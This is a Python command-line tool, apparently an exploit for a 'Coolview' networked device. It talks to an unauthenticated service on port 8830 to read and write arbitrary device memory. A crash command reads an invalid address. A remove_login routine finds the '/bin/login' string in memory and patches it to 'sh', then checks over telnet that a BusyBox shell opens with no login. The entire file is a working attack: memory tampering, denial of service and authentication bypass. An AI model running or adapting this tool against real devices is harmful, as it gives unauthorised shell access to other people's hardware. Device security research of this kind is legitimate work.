import struct
import sys
from telnetlib import Telnet

import fire
import socket
import hexdump


class MemRead:
    def __init__(self, address, size):
        self.len = size
        self.address = address

    def pack(self):
        definition = struct.Struct('>B H I xxxxxxxxx')
        return definition.pack(0x61, self.len, self.address)


class MemWrite:
    def __init__(self, address, data, size):
        self.len = size
        self.data = data
        self.address = address

    def pack(self):
        bytes_list = list(bytes(self.data.ljust(9, b'\0')))
        definition = struct.Struct('>B H I 9B')
        return definition.pack(0x62, self.len, self.address, *bytes_list)


def read(sock, address, size):
    sock.send(MemRead(address, size).pack())

    magic = sock.recv(1)
    if magic != b'\x99':
        print('invalid magic: %02x' % struct.unpack("B", magic)[0])
        return

    size = struct.unpack(">H", sock.recv(2))[0]
    data = sock.recv(size)
    while len(data) < size:
        data += sock.recv(size - len(data))

    ending = sock.recv(1)
    if ending != b'\xee':
        print('invalid ending: %02x' % struct.unpack("B", ending)[0])
        return

    return data


def write(sock, address, data, size):
    sock.send(MemWrite(address, data, size).pack())

    magic = sock.recv(1)
    if magic != b'\xff':
        print('invalid magic: %02x' % struct.unpack("B", magic)[0])
        return False

    ending = sock.recv(1)
    if ending != b'\xee':
        print('invalid ending: %02x' % struct.unpack("B", ending)[0])
        return False

    return True


class CoolviewCLI(object):
    def __init__(self, host, port=8830):
        self.host = host
        self.sock = socket.socket()
        self.sock.connect((host, port))

    def read(self, address, size, hex=False):
        data = read(self.sock, address, size)

        if hex:
            return hexdump.hexdump(data, 'return')
        else:
            sys.stdout.buffer.write(data)
            return ""

    def write(self, address, data: str = '', size=0):
        if data == '':
            data = sys.stdin.buffer.read()
        else:
            data = str(data).encode()

        result = write(self.sock, address, data, max(len(data), size))
        if result is not True:
            return 'failed to write'

    def crash(self):
        read(self.sock, 0x1000000, 0x20)

    def remove_login(self):
        pos = 0xa1efffff
        block = 0
        while pos > 0xa1000000:
            data = read(self.sock, pos, 0x1000)
            if b'/bin/login\x00/etc/issue.net' in data:
                text_addr = pos + data.index(b'/bin/login\x00/etc/issue.net') + 5
                write(self.sock, text_addr, b'sh\x00', 3)
                print(f'Patched at {hex(text_addr)}')

                with Telnet(self.host, 23) as tn:
                    start = tn.read_until(b':')
                    if b'BusyBox' in start:
                        print(f'Login screen removed!')
                        break
                    else:
                        print(f'Login screen still exist. Still trying..')

            if block % 20 == 0:
                print('Position: ', hex(pos), end='\r')
            pos -= 0x1000
            block += 1


if __name__ == '__main__':
    fire.Fire(CoolviewCLI)
